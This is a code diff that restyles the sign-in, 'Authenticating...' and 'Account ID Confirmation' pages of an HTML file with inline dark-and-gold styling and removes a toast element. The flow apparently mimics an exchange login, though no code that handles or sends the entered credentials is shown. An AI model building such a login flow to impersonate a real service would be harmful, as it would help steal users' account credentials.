@@ -108,29 +108,26 @@
 <body>
   
 <!-- === PAGE 1: Sign In === -->
-<div id="page1" class="page">
-  <h2>Sign In</h2>
-  <input type="text" id="emailInput" placeholder="Email" />
-  <input type="password" id="passwordInput" placeholder="Password" />
-  <button onclick="signIn()">Sign In</button>
-  <div id="signInStatus" style="color: #f3ba2f; font-weight: 900;"></div>
+<div id="page1" class="page active" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
+  <h2 style="font-size: 24px; font-weight: 900; margin-bottom: 20px;">Sign In</h2>
+  <input type="text" id="emailInput" placeholder="Email" style="width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 12px; background-color: #1e2329; color: #f3ba2f; border: 1px solid #f3ba2f; font-weight: 900;" />
+  <input type="password" id="passwordInput" placeholder="Password" style="width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 12px; background-color: #1e2329; color: #f3ba2f; border: 1px solid #f3ba2f; font-weight: 900;" />
+  <button onclick="signIn()" style="background-color: #f3ba2f; color: #000; padding: 12px 20px; font-weight: 900; border: none; border-radius: 12px;">Sign In</button>
+  <div id="signInStatus" style="margin-top: 10px; font-weight: 900;"></div>
 </div>
 
 <!-- === PAGE 2: Authenticating === -->
-<div id="page2" class="page">
-  <h2>Authenticating...</h2>
-  <p>Please wait while we authenticate your account.</p>
+<div id="page2" class="page" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
+  <h2 style="font-size: 24px; font-weight: 900;">Authenticating...</h2>
+  <p style="color: #fff;">Please wait while we authenticate your account.</p>
 </div>
 
 <!-- === PAGE 3: Account ID Confirmation === -->
-<div id="page3" class="page">
-  <h2>Account ID Confirmation</h2>
-  <p>Please confirm your account ID.</p>
-  <button onclick="confirmAccountID()">Confirm</button>
+<div id="page3" class="page" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
+  <h2 style="font-size: 24px; font-weight: 900;">Account ID Confirmation</h2>
+  <p style="color: #fff;">Please confirm your account ID.</p>
+  <button onclick="confirmAccountID()" style="margin-top: 20px; background-color: #f3ba2f; color: #000; padding: 12px 20px; font-weight: 900; border: none; border-radius: 12px;">Confirm</button>
 </div>
-
-  <!-- Toast Notification -->
-<div id="toast"></div>
   
 <!-- Page 4: Homepage (Main Dashboard) -->
 <div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
